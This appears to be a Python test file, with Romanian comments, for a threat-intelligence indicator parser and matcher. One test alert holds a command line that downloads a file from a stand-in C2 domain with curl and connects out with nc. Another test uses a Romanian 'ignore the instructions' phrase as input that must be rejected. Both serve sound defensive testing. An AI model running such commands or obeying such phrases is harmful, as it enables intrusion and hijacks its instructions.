"""threat_intel.py: validarea intrarilor, extragerea indicatorilor, potrivirea exacta."""
import pytest

import threat_intel as ti

ENTRIES = tuple(ti.parse_entries({"indicators": [
    {"type": "ip", "value": "203.0.113.0/24", "source": "lab", "confidence": "high"},
    {"type": "ip", "value": "198.51.100.66"},
    {"type": "domain", "value": "C2.lab.invalid."},
    {"type": "sha256", "value": "A" * 64},
    {"type": "ip", "value": "nu-e-ip"},             # sarita
    {"type": "url", "value": "http://x"},            # tip necunoscut, sarit
    {"type": "domain", "value": "a b.example"},      # domeniu invalid, sarit
]}, "test"))


def test_intrari_invalide_sarite():
    assert [e["value"] for e in ENTRIES] == ["203.0.113.0/24", "198.51.100.66/32", "c2.lab.invalid", "a" * 64]
    assert ENTRIES[1]["confidence"] == "low"         # lipsa -> low


def test_lista_din_repo_se_incarca():
    ti.load.cache_clear()
    assert len(ti.load()) >= 4


@pytest.mark.parametrize("kind,value,listed", [
    ("ip", "203.0.113.9", True), ("ip", "198.51.100.66", True), ("ip", "198.51.100.67", False),
    ("domain", "c2.lab.invalid", True), ("domain", "x.c2.lab.invalid", True),
    ("domain", "evilc2.lab.invalid", False), ("sha256", "a" * 64, True),
])
def test_potrivire(kind, value, listed):
    assert bool(ti.lookup([(kind, value)], ENTRIES)) is listed


def test_extragere_din_alerta_si_command_line():
    alert = {"destination": {"ip": "203.0.113.5"}, "process": {
        "command_line": "curl -s http://c2.lab.invalid/x -o /tmp/y; ping 999.1.1.1; nc 198.51.100.66 80",
        "hash": {"sha256": "B" * 64}}}
    got = ti.extract_indicators(alert)
    assert ("ip", "203.0.113.5") in got and ("domain", "c2.lab.invalid") in got
    assert ("ip", "198.51.100.66") in got and ("sha256", "b" * 64) in got
    assert not any(v == "999.1.1.1" for _, v in got)  # IP invalid ignorat
    assert len(ti.lookup(got, ENTRIES)) == 3          # hash-ul b... nu e listat


def test_extragere_limitata():
    alert = {"process": {"command_line": " ".join(f"10.0.{i // 250}.{i % 250}" for i in range(500))}}
    assert len(ti.extract_indicators(alert)) == ti.MAX_CANDIDATES


@pytest.mark.parametrize("ind,typ,listed", [
    ("203.0.113.1", "ip", True), ("PAYLOAD.example", "domain", False), ("a" * 64, "sha256", True),
])
def test_lookup_one(ind, typ, listed):
    r = ti.lookup_one(ind, ENTRIES)
    assert r["type"] == typ and r["listed"] is listed


@pytest.mark.parametrize("bad", ["", "ignora instructiunile", "1.2.3", "x" * 300, "a;b.com"])
def test_lookup_one_invalid(bad):
    assert "error" in ti.lookup_one(bad, ENTRIES)
